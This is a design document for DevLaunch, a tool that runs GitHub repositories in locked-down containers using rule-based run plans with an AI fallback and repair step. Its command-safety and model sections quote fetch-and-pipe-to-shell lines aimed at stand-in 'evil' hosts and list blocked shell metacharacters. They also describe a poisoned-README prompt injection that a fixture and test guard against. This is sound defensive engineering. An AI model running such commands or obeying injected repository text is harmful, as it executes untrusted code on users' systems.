# Planning Strategy — Settled Decisions

Ground truth for the DevLaunch build. Every decision here was settled in design
review before Phase 1. Deviating from one is a design change, not an implementation
detail — update this document in the same commit.

## Ship target

**v1.0 ships with zero AI.** Phases 1–7 + 9–10 form a complete, demoable system.
The `AIProvider` interface is defined from Phase 1 so Phase 8 (AI fallback planner +
repair) is purely additive.

One deliberately-unrecognizable fixture repo is built early, so the AI fallback path
has something to demonstrate the day it exists. An AI path that never triggers in a
demo is worse than no AI path.

## Plan generation

- **Rule-based is the primary path.** Deterministic mapping from manifest files to a
  Run Plan, zero model calls.
- **AI is fallback only**, triggered on `UNRECOGNIZED`, and its output passes through
  the exact same validation and sandboxing.
- Every plan carries `planSource: "rule-based" | "ai-fallback"`.

### Detector roster

Breadth here is the whole argument for the hybrid design: every framework covered
deterministically is one more repository that never costs an AI call. `React` is **not**
a detector — it is a library, not a runtime or dev server. Detect the actual dev server.

**Order is load-bearing.** SvelteKit, Astro, Nuxt and Remix all depend on Vite, and
Docusaurus depends on React. A table walked in the wrong order identifies every
meta-framework as its underlying build tool and produces a plan that cannot work. Most
specific first, always.

| Signal | Type | Port | Host binding |
|---|---|---|---|
| `next` | Next.js | 3000 | `-H 0.0.0.0 -p 3000` |
| `nuxt` | Nuxt | 3000 | `--host 0.0.0.0 --port 3000` |
| `@sveltejs/kit` | SvelteKit | 5173 | `--host 0.0.0.0 --port 5173` |
| `astro` | Astro | 4321 | `--host 0.0.0.0 --port 4321` |
| `@remix-run/dev` | Remix | 3000 | `HOST` / `PORT` |
| `gatsby` | Gatsby | 8000 | `-H 0.0.0.0 -p 8000` (script is `develop`) |
| `@docusaurus/core` | Docusaurus | 3000 | `--host 0.0.0.0 --port 3000` |
| `@angular/cli` or `angular.json` | Angular | 4200 | `--host 0.0.0.0 --port 4200 --disable-host-check` |
| `@vue/cli-service` | Vue CLI | 8080 | `--host 0.0.0.0 --port 8080` |
| `react-scripts` | CRA | 3000 | `HOST` / `PORT` / `BROWSER=none` |
| `vite` | Vite | 5173 | `--host 0.0.0.0 --port 5173` |
| `parcel` | Parcel | 1234 | `--host 0.0.0.0 --port 1234` |
| `webpack-dev-server` | Webpack | 8080 | `--host 0.0.0.0 --port 8080` |
| `@nestjs/core` | NestJS | 3000 | `PORT` (script `start:dev`) |
| `fastify` | Fastify | 3000 | `HOST` — **binding unverified** |
| `koa` | Koa | 3000 | `PORT` |
| `express` | Express | 3000 | `PORT` / `HOST` |
| a `dev`/`start`/`serve` script and nothing else | generic Node | 3000 | unverified |
| `manage.py` | Django | 8000 | `runserver 0.0.0.0:8000` |
| `flask` | Flask | 5000 | `FLASK_APP` + `--host=0.0.0.0` |
| `fastapi` | FastAPI | 8000 | `uvicorn mod:app --host 0.0.0.0` |
| `streamlit` | Streamlit | 8501 | `--server.address 0.0.0.0 --server.headless` |
| `gradio` | Gradio | 7860 | `GRADIO_SERVER_NAME` |

Four details that are the difference between a plan that works and one that hangs:

- **Arguments reach the dev server only through `--`.** `npm run dev --host 0.0.0.0`
  passes the flag to npm; `npm run dev -- --host 0.0.0.0` passes it to the script.
- **Angular needs `--disable-host-check`**, because it rejects requests whose Host
  header it does not recognise — which is every request arriving through a port mapping.
- **Streamlit needs `--server.headless`**, or it prompts for an email address on first
  run and blocks forever. Readiness would report a timeout that says nothing useful.
- **CRA needs `BROWSER=none`**, since it otherwise tries to open a browser in a container.

Fastify and the generic Node fallback declare `hostBinding: "unknown"` rather than
`"forced"`: Fastify binds `127.0.0.1` in code, and a generic script could do anything.
Claiming certainty there would turn a precise `PORT_BOUND_TO_LOCALHOST` diagnosis into a
confusing timeout.

Python packaging: `requirements.txt` → `pip install -r`, `pyproject.toml` →
`pip install .`. A Pipfile-only project is declined rather than guessed at. The runner
image puts `$HOME/.local/bin` on `PATH`, because pip installs console scripts there when
running non-root and every Python start command otherwise fails with exit 127.

### Monorepos

Handled by a narrow deterministic rule, **not** routed to AI. If `workspaces` or
`pnpm-workspace.yaml` exists, find packages with a `dev`/`start` script:

- Exactly one candidate → use it.
- More than one → **ask the user to pick in the UI** (state `AWAITING_INPUT`).

A human picking from a list beats a model guessing, and it is less code.

## Execution model

**Generic allowlisted base image, repo copied in. Repo Dockerfiles are ignored in v1.**

Building a repository's own Dockerfile executes arbitrary `RUN` at build time — the
precise untrusted-code execution the sandbox exists to contain — and it makes the Run
Plan incoherent, because the Dockerfile *becomes* the plan.

**Copy in, never bind-mount.** On Colima's virtiofs, a writable host mount plus a
non-root container user is a permissions minefield, and it lets untrusted code write
into the host clone.

### Container lifecycle

```
docker create  →  docker cp (repo + wrapper)  →  docker start  →  stream docker logs
```

The entrypoint is a **static wrapper script** that runs install → build → start,
emitting phase sentinels to stdout and exiting with a distinct code per phase. This
gives one clean process lifecycle, native log streaming, and unambiguous failure
attribution all at once.

Commands reach the wrapper through **environment variables, never string
interpolation** into the script body. The script is byte-identical on every run.

The start command is `exec`d so signals reach the application, and containers run
with `--init` for correct PID 1 semantics and zombie reaping.

### Base images

**`-slim` (glibc), never Alpine.** musl breaks native modules, and Vite depends on
esbuild. Images are allowlisted; the allowlist is frozen at module load.

DevLaunch builds its **own** runner images (`docker/runner/`, built by
`scripts/build-runner-images.sh`) rather than running stock upstream ones, because a
runner image must pre-create `/workspace` owned by the non-root user. An anonymous
volume inherits ownership from the image path it shadows, so a volume over a path the
image does not create mounts **root-owned** — and a non-root process then cannot write
to it at all.

One **"fat" Node image including `build-essential` + `python3`** is shipped so
`node-gyp` source builds succeed — this converts a whole class of hard ARM failures
into successes.

No per-run image builds in v1. A **named volume caches npm/pip downloads** across
runs, which captures most of the speed benefit without BuildKit complexity.

## Sandbox policy

| Control | Setting |
|---|---|
| Root filesystem | Read-only |
| Writable area | Volume at `/workspace`, with npm cache and `HOME` redirected there |
| Scratch space | tmpfs at `/tmp`, `noexec,nosuid` |
| Memory | 1 GB per container |
| Concurrency | **1 session** |
| Network | General egress allowed; **RFC1918 and 169.254.0.0/16 blocked** |
| Capabilities | `capDrop ALL` |
| User | Non-root |
| Docker socket | Never mounted |

Read-only root plus a writable `/workspace` resolves the original plan's
contradiction between "read-only root filesystem" and "run `npm install`".

Two consequences of `ReadonlyRootfs` that only surfaced under test:

- The Docker API refuses **any** `docker cp` whose extraction target is the rootfs
  ("container rootfs is marked read-only"), even while the container is stopped. Every
  copy must therefore extract at the `/workspace` volume, which is a separate mount and
  does accept writes.
- Host ownership and permissions carry through the tar archive verbatim. A staging
  directory created at `mkdtemp`'s default `0700` arrives as `drwx------` owned by the
  host uid, and the container user cannot traverse it. Copies now normalise ownership
  to the container user and grant group/other whatever read/execute the owner has —
  never write.

Egress must stay open for package registries — restricting it would require a MITM
proxy, which is out of scope. Blocking private ranges is achievable and meaningful:
it stops untrusted containers reaching the LAN or cloud metadata endpoints. The
security docs claim only what is actually implemented.

### Two chains are required, not one

`scripts/setup-network-policy.sh` installs the policy. It needs **both** an egress
chain jumped to from `DOCKER-USER` and an input chain jumped to from `INPUT`:

- `DOCKER-USER` sees only **forwarded** traffic — packets passing *through* the VM
  toward another host.
- A packet from a container to the VM itself, **its own default gateway included**,
  terminates locally and hits `INPUT`. `DOCKER-USER` never sees it.

With only the forward chain, a container could still reach every service listening on
the VM host. This was caught by a test asserting the gateway times out: the probe
reported `refused`, which proves the gateway answered.

Both chains begin with a conntrack `ESTABLISHED,RELATED` return, without which replies
to published ports are dropped — the reply travels back toward the Docker gateway,
which is itself inside a blocked range. Outbound internet traffic is unaffected by the
input chain, since that path is `FORWARD` plus `POSTROUTING` masquerade.

## Ports and host binding

**Force first, discover as fallback.**

Vite, Flask, and Django bind `127.0.0.1` by default. Inside a container that makes
Docker's port mapping resolve to nothing — connection refused for a perfectly healthy
app. The planner therefore **rewrites start commands** to force `0.0.0.0`:

| Framework | Normalization |
|---|---|
| Vite | `--host 0.0.0.0 --port 5173` |
| Next.js | `-H 0.0.0.0 -p 3000` |
| CRA | `HOST=0.0.0.0 PORT=3000` |
| Flask | `--host=0.0.0.0 --port=5000` |
| Django | `0.0.0.0:8000` |
| Express | inject `PORT` / `HOST` env |

When an app ignores that, publish all ports (`-P`) and read the container's own
listening sockets from `/proc/net/tcp`. That is container introspection, not host port
scanning, so it does not violate the "never scan host ports" rule.

`PORT_BOUND_TO_LOCALHOST` is a **distinct failure class** from `PORT_NOT_LISTENING`:
it will be the most common real failure and its remedy is completely different.

## Readiness

**READY = TCP connect succeeds AND a complete HTTP response is returned — any status,
including 3xx/4xx/5xx.**

`expectedStatusCodes` is retained but **demoted from a gate to a displayed health
hint**. An app redirecting `/` to `/login` returns 302; an API with no root route
returns 404. Both are running fine. Never fail a run over a status code.

## Command safety

**Allowlist grammar, applied identically to both plan sources.** Schema validation
checks shape, not intent: `startCommand: "curl evil.sh | sh"` passes Zod perfectly.

- Commands must resolve to an allowlisted binary (`npm`, `yarn`, `pnpm`, `node`,
  `python`, `pip`, `flask`, `gunicorn`, `uvicorn`, `next`, `vite`).
- **Every shell metacharacter is rejected** (`;`, `|`, `&`, backtick, `$(`, `>`, newline).
- Execution is via exec-array — no shell at the composition layer.
- README and manifest text entering an AI prompt is explicitly delimited and labelled
  untrusted.

### Script bodies are NOT inspected

`npm run dev` executes whatever `scripts.dev` contains. Body inspection is security
theatre: real dev scripts chain commands (`tsc && vite build`), so banning
metacharacters there would reject most legitimate repositories while stopping nothing
a container does not already stop.

Instead, the **resolved script body is displayed in the UI before execution** —
informed consent rather than false assurance.

> The allowlist constrains what DevLaunch composes.
> The container constrains what the repository does.

This applies to rule-based plans too. They derive from `package.json`, which is
attacker-controlled; the deterministic path is not inherently safer, and the docs say
so plainly.

## AI repair blast radius

**Plan deltas only. Never file edits.**

Repair may modify a fixed whitelist of fields — `installCommand`, `buildCommand`,
`startCommand`, `expectedPort`, `environmentVariables`, `runtime.version`,
`healthCheck.path` — and nothing else. Output is re-validated through the same
allowlist.

Maximum 2 attempts, and **each attempt must differ from the previous one**, so a
confidently-wrong model cannot burn both retries on identical output.

The attempts are progressive, not two of the same thing. The failure class decides
first whether repair is worth attempting at all (`RepairPolicy`); a rule with evidence
gets the first attempt and spends no model call (`DeterministicRepair`); a model is
asked at most once per failure class, after. "Two model retries for every failure" spent
calls on a missing secret and an outage, and gave the model the first go at failures the
manifest or the log had already settled — "the start script does not exist and `dev`
does" is not a hypothesis.

## Timeouts and session lifetime

The original plan's single ~10-minute budget would kill a READY application while the
user was still using it. The clock is **split**:

- **Time-to-ready budget (~10 min):** clone + install + build + start + readiness.
- **Session lifetime, starting at READY:** 30 min idle timeout, 60 min hard cap, with
  a visible Stop button and countdown. An idle reaper collects abandoned sessions.

## State and logging

**In-memory only. No database.** A `Map` of sessions and a ring buffer. Sessions die
on restart, which is correct for a single-user local tool at concurrency 1. SQLite is
scope we do not need.

Log buffer is capped by **bytes first, lines second** (~5 MB or 10k lines, whichever
hits first) with an explicit truncation marker. A webpack build can emit 10k lines
exceeding 50 MB — capping by line count alone is an OOM in our own backend.

On WebSocket reconnect the client sends its last sequence number; the server replays
from there, or sends a gap marker if those entries were evicted.

## Environment variables

**Pre-flight gate, not discover-by-failing.** After analysis, if `.env.example`
declares variables with no default, execution pauses in state `AWAITING_INPUT` and
collects them in the UI. The gate is skippable.

Values live in memory only, are never written to disk, and are injected at container
create time.

## Repository intake

- `--depth 1 --single-branch`, `--no-recurse-submodules`, `GIT_LFS_SKIP_SMUDGE=1`
- The default branch, unless the session names a branch, tag or commit — then the same
  shallow fetch of exactly that ref, checked out detached. The ref is held to a narrow
  shape (no leading `-`, no `..`) because it reaches `git fetch` as an argument
- Hard caps: **~500 MB and ~20k files**, aborting mid-clone when exceeded
- **Public HTTPS on `github.com` only.** No `ssh://`, no other hosts, nothing
  requiring credentials — this keeps the threat model tight
- Clone into a dedicated temp root so cleanup's `rm -rf` can never escape
- Failure class: `REPOSITORY_TOO_LARGE`

## Architecture

**Native arm64 only — no qemu emulation** (slow and flaky under Colima, and it would
blow the timeouts).

Failure class `ARCH_INCOMPATIBLE`, classified from log signatures: `Exec format
error`, `unsupported platform`, `no prebuilt binaries`.

## Fixtures

**Vendored in-repo** under `fixtures/`, as tiny hand-written apps. Deterministic,
offline, fast, and each failure mode is controlled precisely — the "wrong port"
fixture fails *exactly* that way.

Each fixture carries a **snapshot of its expected Run Plan**, so rule-based detection
is assertion-tested rather than eyeballed.

Two or three real GitHub repositories are kept as a **manual smoke list** for demos,
never in the automated suite.

## Toolchain

pnpm workspaces · Vitest · tsx · `engines.node >= 20`.

## Failure classification

Exit codes and sentinels establish *which phase* failed. Only the output says *why*.
"Dependency installation failed" is true but useless; "a native module ships no arm64
build" tells you what to do next.

Signatures are ordered most-specific-first, for the same reason the planner's table is:
`ECONNREFUSED 127.0.0.1:5432` is a missing database, not a generic network failure. A
broad network rule placed first would swallow it and send the user after the wrong
problem.

Three rules hold for every verdict:

- **It carries its evidence.** The matching log line is attached, so a diagnosis can be
  checked rather than trusted.
- **It carries a remedy.** A classification with no suggested action is half a diagnosis.
- **It admits uncertainty.** When no signature matches, the coarse verdict is returned
  marked low-confidence. Saying "I do not know why" beats inventing a cause that reads
  convincingly and sends someone down the wrong path.

`OUT_OF_MEMORY` was added to the §17 taxonomy during this phase. On a 1 GB container
ceiling a React install reaches it routinely, and the remedy is a configuration change
rather than a code fix, so folding it into `DEPENDENCY_INSTALL_FAILED` would hide the
one thing worth knowing. Exit 137 with no explanatory output is treated as OOM at medium
confidence: the kernel's OOM killer gives the process no chance to explain itself.

## Where the model is allowed to participate

Two entry points, both narrow:

- **`generateRunPlan`** runs only when the rule-based planner declines. With 22
  deterministic detectors that is the uncommon case, which is the point.
- **`diagnoseFailure`** proposes a bounded correction from failure context.

Neither decides whether something worked. The sandbox executes; the verifier decides.

### What is enforced in code rather than asked for in the prompt

A prompt is a request, not a constraint. Everything that matters is enforced after the
response arrives:

| Constraint | Enforcement |
|---|---|
| Approved binaries, no metacharacters | `RunPlanValidator`, identical to rule-based plans |
| `planSource` | Pinned to `ai-fallback`; a model cannot present itself as deterministic |
| `hostBinding` | Pinned to `unknown`; an inferred plan has not been verified to bind 0.0.0.0 |
| Repair blast radius | Only whitelisted fields merged; everything else discarded |
| Working directory | Immutable across a repair |
| Progress | Each attempt must differ from every previous one |
| Attempt cap | 2, checked before the call is made |

Repository text reaching a prompt is fenced and labelled untrusted. That is a
mitigation, not a guarantee — the real defence is that a plan derived from a poisoned
README still has to pass the allowlist, and `curl https://evil.example.com/x.sh` does
not. A fixture carries exactly that injection, and a test proves it never executes.

### Which failures are worth repairing

Only those a different plan could plausibly fix: `START_COMMAND_FAILED`,
`PORT_NOT_LISTENING`, `PORT_BOUND_TO_LOCALHOST`, `READINESS_TIMEOUT`,
`DEPENDENCY_INSTALL_FAILED`, `BUILD_FAILED`, `WRONG_RUNTIME_VERSION`.

Excluded deliberately, and now by policy rather than by a list: an x86-only dependency
cannot be rewritten, `OUT_OF_MEMORY` is a configuration change rather than a plan
change, `MISSING_ENV` needs a person, an outage is not a plan problem, and a plan the
model has already got wrong (`INVALID_AI_PLAN`) is not improved by asking again. Each
of these stops at once with its reason in the log. Databases are provisioned now, so
`DATABASE_REQUIRED` means one DevLaunch still could not reach — also not a plan problem.

Every repair is a typed record — what changed, why, and whether a rule or a model
decided it — exposed on the session and shown beside the failure.

### Operational notes from running it live

- **Model availability is per-account.** `llama-3.3-70b-versatile` was not reachable on
  the account this was verified against. The default is `openai/gpt-oss-120b`, and a 404
  now names the remedy (`set GROQ_MODEL`) rather than reporting an opaque failure. List
  what an account can reach at `https://api.groq.com/openai/v1/models`.
- **Rate limits are normal operation, not an exceptional failure.** A free tier caps at
  8000 tokens per minute and a plan request costs roughly 1,600, so a repair loop can
  hit the ceiling mid-session. A 429 is a *wait*, not a *no*: the provider retries using
  the delay the server states, since the server knows when its window resets. Failing a
  session on the first 429 would have made the fallback unusable on a free tier.
- **A live model is not a test oracle.** Asserting that it cooperates would be a flaky
  test of someone else's service. The invariants worth asserting are ours: either a
  valid plan comes back, or it is rejected for a stated reason. An unsafe command is
  never executable either way.

## The repository is read further than its manifests

Every rule below exists because the deterministic planner declined a repository it had
enough evidence to plan, and the AI fallback then guessed at what a file already said.
Each one was found by running real repositories, not by reading the code.

### The application is not always at the root

A repository is not always a project *or* an application at its top level. The third
shape — and it is common — is an application in `src/` or `backend/` with only
configuration above it: `build: ./src` in a compose file and nothing else. Planning the
root found no manifest, declined, and handed the repository to the model, which then
planned `pip install -r requirements.txt` from a directory that has no requirements.txt.

Discovery already found that directory. It was thrown away by the gate that decides
whether a repository is multi-service, which requires two. It is now carried as
`soleService` and planned when the root cannot be.

### A declared port outranks a framework default

`const port = 8017` beside `app.listen(port, hostname)` is a fact. A framework default is
a prediction, and an application that hardcodes its port ignores the `PORT` DevLaunch
injects — so planning on the default watches a port nothing will ever open and reports a
healthy application as never having started.

The declared port wins only where DevLaunch cannot force one. Vite is told `--port` on
the command line and obeys, so its default stands; Express is not told anything, so what
the source says is the only number that matters.

### A manifest can declare several frameworks, and the scripts say which one runs

A MERN repository declares `express` and `react-scripts` side by side, because one
`package.json` holds both halves. The detector table is walked in order, most specific
first, and that order picks the browser tool — which is usually not what the start script
runs. This one runs `node ./bin/www`.

The script body settles it, because the script body is the author saying what starts. It
is not cosmetic: the two frameworks differ in default port and in argument style, so a
Vite-shaped guess appends `--host 0.0.0.0 --port 5173` to a command that is really
`node server.js`, and then watches a port nothing will open.

Frameworks are recognised by different evidence depending on how they start. A build tool
is invoked by name (`vite`, `react-scripts start`); a server framework is imported by a
file handed to `node`. `startedBy` in the detector table records which.

### Imports are a declaration

A lone `app.py` with no requirements.txt is the commonest shape of tutorial repository on
GitHub, and every one of them was declined — "No requirements.txt or pyproject.toml
found" — and handed to the model, which read the imports and installed them.
`import flask_sqlalchemy` is a declaration, not a hint.

Three things keep this from guessing:

- **The standard library is excluded by name.** `pip install os` fails, and it fails the
  whole command with it. The list is long and deliberately so: every name missing from it
  becomes an install of something that does not exist.
- **The repository's own modules are excluded**, files and package directories both.
  `routers/` is a directory this repository provides; `pip install routers` is not a
  thing.
- **The walk follows the repository's own imports**, bounded to twelve files. A FastAPI
  tutorial's `main.py` imports `fastapi` and `models`, and `models.py` is where
  `sqlalchemy` appears. Reading the entry file alone installed two of three and the run
  died on `No module named 'sqlalchemy'`.

A requirements.txt or pyproject.toml always wins. This is the last resort, and it says so
in a warning: the versions are not pinned, because the repository pinned none.

### The variable a service reads its connection string from

The alias list — `MONGO_URI`, `MONGODB_URI`, `MONGO_URL`, `MONGODB_URL` — can be
lengthened for ever and will keep losing this race. One real repository passes
`process.env.CONNECTION_STRING` to `mongoose.connect`, so a provisioned, healthy MongoDB
was injected under four names it never read and it crashed at boot with
`The uri parameter to openUri() must be a string, got "undefined"`.

What the service's own source says it reads cannot lose that race. Two conditions keep it
from guessing: the name has to be shaped like a connection string rather than like a
setting (and `CLIENT_URL`, `WEBHOOK_URL` and their kind are excluded by name — writing a
database address into one would break a working application to fix one that is not
broken), and it has to be attributable, either by naming its kind outright or by there
being exactly one kind to attribute it to.

### Django migrates before it serves

Every Django README says to run `manage.py migrate` before the server, and it is the same
command for every Django project there has ever been. Without it the server starts,
prints `You have N unapplied migration(s)` into a log nobody reads, and returns 500 from
the first page that touches the database — which reads as DevLaunch having broken the
project rather than having skipped a step.

A schema script the repository names outright still wins: it knows this repository, where
`manage.py migrate` knows Django.

## Two Node versions, chosen from evidence

DevLaunch ships Node 20 and Node 22. 20 is the default, and that is a decision rather
than an accident: a project that runs on 20 runs on the version its author most likely
used, and a newer runtime is a change — the dependency tree resolves against whichever
Node runs.

22 exists because a repository asked for something 20 does not have. `node:sqlite`
arrived in 22.5, and a project importing it cannot run on 20 at all: no plan, no repair
and no dependency reaches a built-in module that is not in the binary. The failure is
not a dependency error a person can act on. It is `ERR_UNKNOWN_BUILTIN_MODULE`, thrown
inside the module loader, from a name that looks like every other built-in — and because
`node --watch` keeps the container alive after the crash, it surfaced as "nothing is
listening on port 3000" while a model rewrote the start command.

The version is chosen from two kinds of evidence, and the stronger one is not the
manifest:

- **A `node:` import.** `engines.node` is a declaration many projects never make — the one
  that prompted this declares none — while `import { DatabaseSync } from 'node:sqlite'`
  is made by necessity. Only the prefixed form is read: `node:sqlite` cannot be anything
  but the built-in, where a bare `sqlite` could be any package on npm.
- **An `engines.node` lower bound**, and only one an approved image can satisfy. An upper
  bound is reported as a warning instead; silently running a version the repository
  excluded would be worse than running the default and saying so.

The lowest approved version that satisfies the floor wins, and the choice is said out
loud whenever it is not the default. When nothing approved is high enough, the default
runs and the failure names what is missing — pretending to satisfy a floor we cannot
reach would replace one honest error with a confusing one.

One Dockerfile builds both, parameterised by `NODE_VERSION`. Everything in it is a
property of DevLaunch's sandbox rather than of a Node release, and the reasoning in its
comments is the part that must not be duplicated.

### And so a version mismatch became repairable

`WRONG_RUNTIME_VERSION` was non-repairable *because* the allowlist carried one image per
language, with a test tying the policy to that fact and promising that approving a second
version would change it. It did. A rule now moves `runtime.version` to the nearest
approved version above the one that failed.

The model budget stays at zero, and that is not a matter of degree: no plan a model
writes can conjure an image that is not on the allowlist, so asking it spends a call to
be told what the allowlist already says.

## Which file is the application, and where it runs from

The Python entry scan reads every top-level `.py` file, because a Streamlit dashboard is
called `dashboard.py` and no list of names catches the next one. That breadth needs a
counterweight, and it did not have one: when no file imports the framework, the fallback
took whatever came first. One repository's only top-level module is `tests.py`, so it was
started as `FLASK_APP=tests`, and then — after a model was asked to guess again — as
`FLASK_APP=app`. Neither is an application.

Two changes, and they belong together:

- **Candidates carry whether they are *named* like an entry point.** The fallback takes a
  conventional name or nothing. Only an explicit `false` disqualifies one: the bug being
  guarded against is a scan that *added* junk, and that scan marks what it adds, so
  "nobody said" is safe to allow.
- **The application may be one level down without being a package.** `app/app.py` with no
  `__init__.py` is a common small-Flask shape, invisible to the package scan (which
  requires `__init__.py`) and to the root scan (which does not look down). It is found
  now, bounded to immediate subdirectories and conventional filenames, skipping `tests/`,
  `docs/`, `migrations/` and their kind.

Where the entry lives decides where the plan runs. `app/app.py` imports its siblings as
`from routes.task_route import ...`, which only resolves with `app/` as the working
directory — so `workingDirectory` is the entry's directory and `installDirectory` stays
where the manifest is. The plan says so in a warning, because running somewhere other
than the repository root is a decision.

### Locality is relative to the importer

The import walk's notion of "a module this repository provides" was the repository root's
listing. `app/app.py` importing `routes.task_route` is a directory inside `app/` — nowhere
in that listing — so `routes` was proposed to pip as a distribution to install. The set
now grows as the walk descends: whatever sits beside a file is local to it.

The walk is also seeded from a subdirectory entry. It started only from root `.py` files,
so a repository whose entire application lives in `app/` collected no imports at all.

### A declared dependency list can still be missing one

This was reasoned about twice and the first answer was too broad. The rule that extends an
install from an error naming a package refused to touch `-r requirements.txt`, because a
repository that declares its dependencies owns the gaps in them. That is right about whose
bug it is and wrong about what DevLaunch can see: one repository imports `flasgger` in its
application and lists Flask, Werkzeug, requests and pytest.

The import is a declaration too, and it is the one that decides whether the program runs.
So a declared list is extended as well — but only by a module the project's own source
imports, and never by a name read out of a log alone. A package the requirements file
already pins is left alone, because installing it twice resolves it twice and the second
answer is not the one the repository asked for.
